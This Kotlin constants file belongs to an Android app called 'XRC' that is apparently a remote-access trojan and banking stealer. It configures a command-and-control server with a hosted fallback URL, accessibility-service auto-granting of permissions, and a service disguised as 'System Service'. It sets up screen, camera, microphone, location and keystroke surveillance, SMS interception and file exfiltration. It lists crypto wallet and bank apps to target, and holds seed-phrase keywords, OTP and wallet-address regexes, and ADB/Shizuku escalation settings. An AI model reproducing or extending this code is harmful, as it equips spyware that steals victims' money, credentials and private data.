package com.xrc.app.util

import com.xrc.app.XRCApp

/**
 * Application-wide constants.
 * Centralized configuration for easy tuning.
 */
object Constants {
    // App identity
    const val PACKAGE_NAME = XRCApp.PACKAGE_NAME
    const val APP_NAME = "XRC"
    const val APP_VERSION = "1.0.0"
    const val APP_VERSION_CODE = 100

    // C2 Server
    const val C2_DEFAULT_HOST = "127.0.0.1"
    const val C2_DEFAULT_PORT = 8080
    const val C2_DEFAULT_URL = "ws://127.0.0.1:8080/ws"
    const val C2_FALLBACK_URL = "https://xrc-c2.onrender.com/ws"
    const val C2_PING_INTERVAL = 30000L
    const val C2_RECONNECT_INTERVAL = 5000L
    const val C2_MAX_RECONNECT_ATTEMPTS = 100
    const val C2_RESPONSE_TIMEOUT = 10000L

    // AES encryption
    const val AES_KEY_SIZE = 256
    const val AES_IV_SIZE = 12
    const val AES_TAG_SIZE = 128
    const val AES_ALGORITHM = "AES/GCM/NoPadding"

    // RSA
    const val RSA_KEY_SIZE = 2048
    const val RSA_ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding"

    // Accessibility
    const val ACCESSIBILITY_SERVICE_NAME = "${PACKAGE_NAME}/.service.XRCAccessibilityService"
    const val ACCESSIBILITY_ENABLED_KEY = "accessibility_enabled"
    const val ACCESSIBILITY_SERVICES_KEY = "enabled_accessibility_services"
    const val AUTO_GRANT_INTERVAL = 500L
    const val AUTO_GRANT_TEXT = "Allow"

    // Notification channel
    const val NOTIFICATION_CHANNEL_ID = "xrc_core_channel"
    const val NOTIFICATION_CHANNEL_NAME = "XRC Core Service"
    const val NOTIFICATION_ID = 1001
    const val NOTIFICATION_ONGOING_ID = 1002

    // Foreground service
    const val FOREGROUND_SERVICE_TITLE = "System Service"
    const val FOREGROUND_SERVICE_TEXT = "Running"

    // Surveillance defaults
    const val SCREEN_CAPTURE_INTERVAL = 2000L
    const val LOCATION_UPDATE_INTERVAL = 30000L
    const val LOCATION_MIN_DISTANCE = 10f
    const val CAMERA_PHOTO_INTERVAL = 5000L
    const val MIC_RECORDING_DURATION = 30000L
    const val KEYLOGGER_BUFFER_SIZE = 1000
    const val SMS_INTERCEPT_TARGET = ""

    // File exfiltration
    const val MAX_FILE_SIZE = 10 * 1024 * 1024 // 10MB
    const val EXFILTRATION_CHUNK_SIZE = 1024 * 512 // 512KB
    const val EXFILTRATION_BASE_PATH = "/sdcard/"

    // File types for scanning
    const val PHOTO_EXTENSIONS = ".jpg,.jpeg,.png,.gif,.bmp,.webp"
    const val VIDEO_EXTENSIONS = ".mp4,.avi,.mkv,.mov,.wmv,.flv"
    const val DOCUMENT_EXTENSIONS = ".pdf,.doc,.docx,.xls,.xlsx,.txt,.csv"
    const val CRYPTO_EXTENSIONS = ".dat,.wallet,.key,.json,.pem,.p12,.seed,.mnemonic"

    // Photo directories
    val PHOTO_DIRECTORIES = listOf(
        "/sdcard/DCIM/",
        "/sdcard/Pictures/",
        "/sdcard/Download/",
        "/sdcard/Android/media/"
    )

    // Crypto wallet packages (most common)
    val CRYPTO_WALLET_PACKAGES = listOf(
        "io.metamask",
        "com.trustwallet.app",
        "com.binance.dev",
        "com.coinbase.android",
        "com.exodusmovement.exodus",
        "de.metamask",
        "com.myetherwallet.mewconnect",
        "com.ledger.live",
        "com.alphawallet.token",
        "io.rainbow.me",
        "com.defi.wallet",
        "com.elrond.maiar.wallet",
        "com.argent.argent",
        "network.green.energy",
        "app.uniswap",
        "com.pancakeswap",
        "io.1inch.android",
        "org.torproject.android",
        "com.bitcoin.wallet.btc",
        "com.electrum.wallet"
    )

    // Financial app targets (banking + finance)
    val FINANCIAL_APP_PACKAGES = listOf(
        "com.chase",
        "com.wf.wellsfargo",
        "com.bofa",
        "com.citi",
        "com.usbank",
        "org.wb",
        "com.pnc",
        "com.td",
        "com.capone",
        "com.bankofamerica",
        "com.coinbase.android",
        "com.binance.dev",
        "io.metamask",
        "com.trustwallet.app",
        "com.paypal.android",
        "com.squareup.cash",
        "com.venmo",
        "com.revolut",
        "com.transferwise",
        "com.monzo",
        "com.starling",
        "com.gocardless",
        "com.wise",
        "com.remitly",
        "com.worldremit",
        "com.google.android.apps.nbu.paisa",
        "com.phonepe",
        "net.billdesk.paytm",
        "com.amazon.mobile.payments",
        "com.samsung.android.samsungpay",
        "com.google.android.apps.walletnfcrel",
        "com.android.stk",
        "com.sbi",
        "com.hdfc",
        "com.icici",
        "com.axis",
        "com.kotak",
        "com.yesbank",
        "com.indusind",
        "com.rblbank"
    )

    // Seed phrase keywords for OCR scanning
    val SEED_PHRASE_KEYWORDS = listOf(
        "seed", "mnemonic", "recovery", "backup", "wallet",
        "phrase", "private key", "secret", "passphrase",
        "24 words", "12 words", "recovery phrase", "seed phrase"
    )

    // Known OTP regex patterns
    val OTP_PATTERNS = listOf(
        Regex("""\b\d{4,8}\b"""),
        Regex("""OTP:\s*\d{4,8}"""),
        Regex("""code:\s*\d{4,8}"""),
        Regex("""verification code:\s*\d{4,8}"""),
        Regex("""\d{4,8}\s+is your"""),
        Regex("""one-time password:\s*\d{4,8}""")
    )

    // Crypto address regex patterns
    val CRYPTO_ADDRESS_PATTERNS = mapOf(
        "BTC" to Regex("""\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"""),
        "ETH" to Regex("""\b0x[a-fA-F0-9]{40}\b"""),
        "XRP" to Regex("""\br[1-9A-HJ-NP-Za-km-z]{25,34}\b"""),
        "LTC" to Regex("""\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\b"""),
        "BCH" to Regex("""\b(q|p)[a-z0-9]{41}\b"""),
        "ADA" to Regex("""\baddr1[a-z0-9]{58}\b"""),
        "DOT" to Regex("""\b1[a-km-zA-HJ-NP-Z1-9]{47}\b"""),
        "SOL" to Regex("""\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"""),
        "USDT" to Regex("""\b0x[a-fA-F0-9]{40}\b""")
    )

    // ADB escalation
    const val ADB_WIRELESS_PORT = 5555
    const val ADB_LOCALHOST_IP = "127.0.0.1"
    const val ADB_PAIRING_PORT = 41337

    // Shizuku
    const val SHIZUKU_PACKAGE = "moe.shizuku.manager"
    const val SHIZUKU_PROVIDER = "moe.shizuku.manager.api"
    const val SHIZUKU_MIN_VERSION = 7

    // Timeouts
    const val DEFAULT_TIMEOUT = 30000L
    const val LONG_TIMEOUT = 120000L
    const val SHORT_TIMEOUT = 5000L

    // Max values
    const val MAX_BACKUP_METHODS_PER_PERMISSION = 5
    const val MAX_RECONNECT_ATTEMPTS = 50
    const val MAX_KEYLOG_ENTRIES = 10000
    const val MAX_NOTIFICATION_CACHE = 500
    const val MAX_FILE_EXFILTRATION_COUNT = 1000
}
